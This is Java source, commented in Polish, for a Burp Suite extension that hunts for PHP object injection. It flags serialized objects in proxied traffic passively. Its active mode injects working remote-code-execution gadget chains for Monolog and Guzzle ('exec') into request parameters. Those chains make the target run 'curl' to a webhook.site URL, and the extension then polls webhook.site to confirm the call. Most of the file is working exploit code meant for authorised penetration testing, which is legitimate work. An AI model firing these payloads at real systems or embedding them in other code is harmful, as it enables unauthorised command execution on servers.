import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.proxy.http.InterceptedRequest;
import burp.api.montoya.proxy.http.ProxyRequestHandler;
import burp.api.montoya.proxy.http.ProxyRequestReceivedAction;
import burp.api.montoya.proxy.http.ProxyRequestToBeSentAction;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;
import burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;

import javax.swing.*;
import java.awt.*;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class PhpObjectInjectionScanner implements BurpExtension {

    // TUTAJ PODAJ SWÓJ UNIKALNY TOKEN Z WEBHOOK.SITE (UUID)
    private static final String WEBHOOK_TOKEN = "WPROWADZ_SWOJ_TOKEN_TUTAJ";

    private MontoyaApi api;
    private ScheduledExecutorService scheduler;
    private int lastWebhookInteractionCount = 0;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.api.extension().setName("PHP Object Injection Scanner (CE Edition)");

        // 1. Skanowanie Pasywne - Rejestracja handlera Proxy (działa w tle dla całego ruchu)
        api.proxy().registerRequestHandler(new PoiPassiveProxyHandler(api));

        // 2. Skanowanie Aktywne - Rejestracja opcji w menu kontekstowym (prawy przycisk myszy)
        api.userInterface().registerContextMenuItemsProvider(new PoiActiveContextMenuProvider(api, WEBHOOK_TOKEN));

        // Asynchroniczny wątek odpytujący API Webhook.site
        this.scheduler = Executors.newScheduledThreadPool(2);
        this.scheduler.scheduleAtFixedRate(this::pollWebhookInteractions, 10, 10, TimeUnit.SECONDS);

        api.extension().registerUnloadingHandler(() -> {
            if (scheduler != null && !scheduler.isShutdown()) {
                scheduler.shutdownNow();
            }
        });

        api.logging().logToOutput("Wtyczka PHP Object Injection Scanner załadowana (Tryb Community Edition).");
    }

    private void pollWebhookInteractions() {
        if (WEBHOOK_TOKEN.equals("WPROWADZ_SWOJ_TOKEN_TUTAJ")) return;

        try {
            String apiUrl = "https://webhook.site/token/" + WEBHOOK_TOKEN + "/requests";
            HttpRequest request = HttpRequest.httpRequestFromUrl(apiUrl);
            HttpRequestResponse response = api.http().sendRequest(request);

            String body = response.response().bodyToString();

            Matcher matcher = Pattern.compile("\"total\":\\s*([0-9]+)").matcher(body);
            if (matcher.find()) {
                int currentTotal = Integer.parseInt(matcher.group(1));

                if (currentTotal > lastWebhookInteractionCount) {
                    int newInteractions = currentTotal - lastWebhookInteractionCount;
                    api.logging().logToOutput("[!!!] KRYTYCZNE: Wykryto nową interakcję OOB (HTTP)! Zarejestrowano " + newInteractions + " nowych wywołań w Webhook.site.");
                    lastWebhookInteractionCount = currentTotal;
                }
            }
        } catch (Exception e) {
            api.logging().logToError("Błąd podczas łączenia z API webhook.site: " + e.getMessage());
        }
    }

    // --- SKANOWANIE PASYWNE (NASŁUCHIWANIE PROXY) ---
    private static class PoiPassiveProxyHandler implements ProxyRequestHandler {
        private final MontoyaApi api;
        private final Pattern POI_PATTERN = Pattern.compile("(O:[0-9]+:\"[^\"]+\":[0-9]+:\\{|a:[0-9]+:\\{)");

        public PoiPassiveProxyHandler(MontoyaApi api) {
            this.api = api;
        }

        @Override
        public ProxyRequestReceivedAction handleRequestReceived(InterceptedRequest interceptedRequest) {
            interceptedRequest.parameters().forEach(parameter -> {
                String value = parameter.value();
                boolean found = false;

                if (isSerializedPhp(value)) {
                    found = true;
                } else {
                    String urlDecoded = api.utilities().urlUtils().decode(value).toString();
                    if (isSerializedPhp(urlDecoded)) {
                        found = true;
                    } else {
                        try {
                            String base64Decoded = api.utilities().base64Utils().decode(value).toString();
                            if (isSerializedPhp(base64Decoded)) {
                                found = true;
                            }
                        } catch (Exception ignored) { }
                    }
                }

                if (found) {
                    String msg = "[PASYWNE] Znaleziono potencjalny zserializowany obiekt PHP w parametrze: " + parameter.name() + " (URL: " + interceptedRequest.url() + ")";
                    api.logging().logToOutput(msg);
                }
            });

            return ProxyRequestReceivedAction.continueWith(interceptedRequest);
        }

        @Override
        public ProxyRequestToBeSentAction handleRequestToBeSent(InterceptedRequest interceptedRequest) {
            return ProxyRequestToBeSentAction.continueWith(interceptedRequest);
        }

        private boolean isSerializedPhp(String value) {
            return value != null && !value.isEmpty() && POI_PATTERN.matcher(value).find();
        }
    }

    // --- SKANOWANIE AKTYWNE (MENU KONTEKSTOWE) ---
    private class PoiActiveContextMenuProvider implements ContextMenuItemsProvider {
        private final MontoyaApi api;
        private final String webhookToken;
        private final Pattern PHP_ERROR_PATTERN = Pattern.compile("(?i)(unserialize\\(\\)|PHP Fatal error|Object\\sInjection)");

        public PoiActiveContextMenuProvider(MontoyaApi api, String webhookToken) {
            this.api = api;
            this.webhookToken = webhookToken;
        }

        @Override
        public List<Component> provideMenuItems(ContextMenuEvent event) {
            List<Component> menuItems = new ArrayList<>();

            if (event.messageEditorRequestResponse().isPresent() || !event.selectedRequestResponses().isEmpty()) {
                JMenuItem scanItem = new JMenuItem("Skanuj podatność POI (Aktywnie)");
                scanItem.addActionListener(e -> {
                    List<HttpRequestResponse> targets = new ArrayList<>(event.selectedRequestResponses());
                    if (targets.isEmpty() && event.messageEditorRequestResponse().isPresent()) {
                        targets.add(event.messageEditorRequestResponse().get().requestResponse());
                    }

                    scheduler.submit(() -> performActiveScan(targets));
                });
                menuItems.add(scanItem);
            }
            return menuItems;
        }

        private void performActiveScan(List<HttpRequestResponse> targets) {
            api.logging().logToOutput("[AKTYWNE] Rozpoczęto aktywne skanowanie " + targets.size() + " żądań...");

            for (HttpRequestResponse baseRequestResponse : targets) {
                HttpRequest baseRequest = baseRequestResponse.request();

                for (ParsedHttpParameter param : baseRequest.parameters()) {
                    api.logging().logToOutput("Testowanie parametru: " + param.name() + " w URL: " + baseRequest.url());

                    // 1. Detekcja błędów
                    String errorPayload = "O:999999:\"NonExistentClassForErrorTrigger\":0:{}";
                    sendAndCheckPayload(baseRequest, param, errorPayload, true);

                    // 2. Fuzzing przy użyciu łańcuchów gadżetów
                    if (!webhookToken.equals("WPROWADZ_SWOJ_TOKEN_TUTAJ")) {
                        String cmd = "curl -s http://webhook.site/" + webhookToken;
                        int cmdLen = cmd.length();

                        String[] gadgetChains = {
                                "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"\\x00*\\x00socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\\x00*\\x00handler\";r:2;s:9:\"\\x00*\\x00buffer\";a:1:{i:0;a:2:{i:0;s:" + cmdLen + ":\"" + cmd + "\";s:5:\"level\";N;}}s:13:\"\\x00*\\x00bufferSize\";i:-1;s:14:\"\\x00*\\x00initialized\";b:1;s:14:\"\\x00*\\x00bufferLimit\";i:-1;s:13:\"\\x00*\\x00flushOnOverflow\";b:0;s:8:\"\\x00*\\x00level\";N;}}",
                                "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\\x00GuzzleHttp\\Psr7\\FnStream\\x00methods\";a:1:{s:5:\"close\";s:4:\"exec\";}s:9:\"_fn_close\";s:" + cmdLen + ":\"" + cmd + "\";}"
                        };

                        for (String gadgetPayload : gadgetChains) {
                            sendAndCheckPayload(baseRequest, param, gadgetPayload, false);
                        }
                    }
                }
            }
            api.logging().logToOutput("[AKTYWNE] Zakończono wysyłanie payloadów.");
        }

        private void sendAndCheckPayload(HttpRequest baseRequest, ParsedHttpParameter param, String payload, boolean checkError) {
            HttpParameter newParam = HttpParameter.parameter(param.name(), payload, param.type());
            HttpRequest testRequest = baseRequest.withUpdatedParameters(newParam);

            HttpRequestResponse reqRes = api.http().sendRequest(testRequest);

            if (checkError) {
                Matcher errorMatcher = PHP_ERROR_PATTERN.matcher(reqRes.response().bodyToString());
                if (errorMatcher.find()) {
                    String msg = "[AKTYWNE] Wykryto błąd unserialize() w parametrze: " + param.name() + " (URL: " + baseRequest.url() + ")";
                    api.logging().logToOutput(msg);

                    try {
                        AuditIssue issue = AuditIssue.auditIssue("Podejrzenie PHP Object Injection (Wykryto błąd)", msg, null, reqRes.request().url(), AuditIssueSeverity.MEDIUM, AuditIssueConfidence.TENTATIVE, null, null, AuditIssueSeverity.MEDIUM, reqRes);
                        api.siteMap().add(issue);
                    } catch (Exception e) {
                        // Ignoruj jeśli wersja CE zablokuje dodanie do SiteMapy
                    }
                }
            }
        }
    }
}